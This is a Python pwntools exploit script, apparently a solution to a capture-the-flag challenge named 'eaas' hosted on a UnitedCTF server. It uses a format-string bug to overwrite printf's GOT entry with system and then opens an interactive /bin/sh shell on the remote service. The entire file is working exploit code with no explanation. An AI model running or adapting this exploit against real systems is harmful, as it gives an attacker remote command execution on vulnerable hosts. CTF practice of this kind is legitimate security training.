#!/usr/bin/python3
from pwn import *

context.clear(arch="amd64")
context.log_level = "error"

RHOST, RPORT = "nc.ctf.unitedctf.ca", 4003

elf = ELF("./dist/eaas")


def trigger_fmt(payload):
    r = remote(RHOST, RPORT)
    for _ in range(20):
        r.recvline()
    r.sendline(payload)
    return r.recvline()


writes = {elf.got["printf"]: elf.plt["system"]}

autofmt = FmtStr(trigger_fmt)
payload = fmtstr_payload(autofmt.offset, writes)

r = remote(RHOST, RPORT)
for _ in range(20):
    r.recvline()
r.sendline(payload)
r.sendline(b"/bin/sh")
r.interactive()
